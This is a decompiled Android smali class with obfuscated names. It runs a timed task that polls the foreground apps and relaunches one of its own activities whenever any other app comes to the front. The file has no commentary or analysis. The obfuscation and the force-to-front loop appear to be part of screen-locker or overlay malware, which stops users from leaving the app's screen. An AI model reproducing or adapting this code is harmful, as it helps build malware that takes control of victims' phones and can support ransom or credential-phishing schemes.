.class Lcom/azianames/foroneyhar/js3knzbdy/ozpoxuz523b2;
.super Ljava/util/TimerTask;


# instance fields
.field private ozpoxuz523b2:Landroid/app/ActivityManager;

.field final synthetic ttmhx7:Lcom/azianames/foroneyhar/js3knzbdy/gmyiuqcz;


# direct methods
.method private constructor <init>(Lcom/azianames/foroneyhar/js3knzbdy/gmyiuqcz;)V
    .locals 0

    iput-object p1, p0, Lcom/azianames/foroneyhar/js3knzbdy/ozpoxuz523b2;->ttmhx7:Lcom/azianames/foroneyhar/js3knzbdy/gmyiuqcz;

    invoke-direct {p0}, Ljava/util/TimerTask;-><init>()V

    return-void
.end method

.method synthetic constructor <init>(Lcom/azianames/foroneyhar/js3knzbdy/gmyiuqcz;Lcom/azianames/foroneyhar/js3knzbdy/ttmhx7;)V
    .locals 0

    invoke-direct {p0, p1}, Lcom/azianames/foroneyhar/js3knzbdy/ozpoxuz523b2;-><init>(Lcom/azianames/foroneyhar/js3knzbdy/gmyiuqcz;)V

    return-void
.end method


# virtual methods
.method ozpoxuz523b2()[Ljava/lang/String;
    .locals 5

    new-instance v1, Ljava/util/HashSet;

    invoke-direct {v1}, Ljava/util/HashSet;-><init>()V

    iget-object v0, p0, Lcom/azianames/foroneyhar/js3knzbdy/ozpoxuz523b2;->ozpoxuz523b2:Landroid/app/ActivityManager;

    invoke-virtual {v0}, Landroid/app/ActivityManager;->getRunningAppProcesses()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v2

    :cond_0
    :goto_0
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_1

    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/ActivityManager$RunningAppProcessInfo;

    iget v3, v0, Landroid/app/ActivityManager$RunningAppProcessInfo;->importance:I

    const/16 v4, 0x64

    if-ne v3, v4, :cond_0

    iget-object v0, v0, Landroid/app/ActivityManager$RunningAppProcessInfo;->pkgList:[Ljava/lang/String;

    invoke-static {v0}, Ljava/util/Arrays;->asList([Ljava/lang/Object;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v1, v0}, Ljava/util/Set;->addAll(Ljava/util/Collection;)Z

    goto :goto_0

    :cond_1
    invoke-interface {v1}, Ljava/util/Set;->size()I

    move-result v0

    new-array v0, v0, [Ljava/lang/String;

    invoke-interface {v1, v0}, Ljava/util/Set;->toArray([Ljava/lang/Object;)[Ljava/lang/Object;

    move-result-object v0

    check-cast v0, [Ljava/lang/String;

    return-object v0
.end method

.method public run()V
    .locals 6

    iget-object v0, p0, Lcom/azianames/foroneyhar/js3knzbdy/ozpoxuz523b2;->ttmhx7:Lcom/azianames/foroneyhar/js3knzbdy/gmyiuqcz;

    invoke-virtual {v0}, Lcom/azianames/foroneyhar/js3knzbdy/gmyiuqcz;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    iget-object v0, p0, Lcom/azianames/foroneyhar/js3knzbdy/ozpoxuz523b2;->ttmhx7:Lcom/azianames/foroneyhar/js3knzbdy/gmyiuqcz;

    const-string v1, "activity"

    invoke-virtual {v0, v1}, Lcom/azianames/foroneyhar/js3knzbdy/gmyiuqcz;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/ActivityManager;

    iput-object v0, p0, Lcom/azianames/foroneyhar/js3knzbdy/ozpoxuz523b2;->ozpoxuz523b2:Landroid/app/ActivityManager;

    invoke-static {v2}, Lcom/azianames/foroneyhar/cehyzt7dw;->uin6g3d5rqgcbs(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_2

    invoke-static {v2}, Lcom/azianames/foroneyhar/cehyzt7dw;->cehyzt7dw(Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_3

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x14

    if-le v0, v1, :cond_1

    invoke-virtual {p0}, Lcom/azianames/foroneyhar/js3knzbdy/ozpoxuz523b2;->ozpoxuz523b2()[Ljava/lang/String;

    move-result-object v0

    move-object v1, v0

    :goto_0
    if-eqz v1, :cond_3

    array-length v3, v1

    const/4 v0, 0x0

    :goto_1
    if-ge v0, v3, :cond_3

    aget-object v4, v1, v0

    invoke-virtual {v4}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    sget-object v5, Lcom/azianames/foroneyhar/ttmhx7;->olqqn4x4:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_0

    new-instance v4, Landroid/content/Intent;

    const-class v5, Lcom/azianames/foroneyhar/js3knzbdy/hguuul;

    invoke-direct {v4, v2, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v5, 0x10000000

    invoke-virtual {v4, v5}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    invoke-virtual {v2, v4}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    :cond_0
    add-int/lit8 v0, v0, 0x1

    goto :goto_1

    :cond_1
    invoke-virtual {p0}, Lcom/azianames/foroneyhar/js3knzbdy/ozpoxuz523b2;->ttmhx7()[Ljava/lang/String;

    move-result-object v0

    move-object v1, v0

    goto :goto_0

    :cond_2
    iget-object v0, p0, Lcom/azianames/foroneyhar/js3knzbdy/ozpoxuz523b2;->ttmhx7:Lcom/azianames/foroneyhar/js3knzbdy/gmyiuqcz;

    invoke-static {v0}, Lcom/azianames/foroneyhar/js3knzbdy/gmyiuqcz;->ttmhx7(Lcom/azianames/foroneyhar/js3knzbdy/gmyiuqcz;)Ljava/util/Timer;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/Timer;->cancel()V

    iget-object v0, p0, Lcom/azianames/foroneyhar/js3knzbdy/ozpoxuz523b2;->ttmhx7:Lcom/azianames/foroneyhar/js3knzbdy/gmyiuqcz;

    invoke-static {v0}, Lcom/azianames/foroneyhar/js3knzbdy/gmyiuqcz;->ttmhx7(Lcom/azianames/foroneyhar/js3knzbdy/gmyiuqcz;)Ljava/util/Timer;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/Timer;->purge()I

    :cond_3
    return-void
.end method

.method ttmhx7()[Ljava/lang/String;
    .locals 3

    const/4 v1, 0x1

    const/4 v2, 0x0

    iget-object v0, p0, Lcom/azianames/foroneyhar/js3knzbdy/ozpoxuz523b2;->ozpoxuz523b2:Landroid/app/ActivityManager;

    invoke-virtual {v0, v1}, Landroid/app/ActivityManager;->getRunningTasks(I)Ljava/util/List;

    move-result-object v0

    new-array v1, v1, [Ljava/lang/String;

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/ActivityManager$RunningTaskInfo;

    iget-object v0, v0, Landroid/app/ActivityManager$RunningTaskInfo;->topActivity:Landroid/content/ComponentName;

    invoke-virtual {v0}, Landroid/content/ComponentName;->getClassName()Ljava/lang/String;

    move-result-object v0

    aput-object v0, v1, v2

    return-object v1
.end method
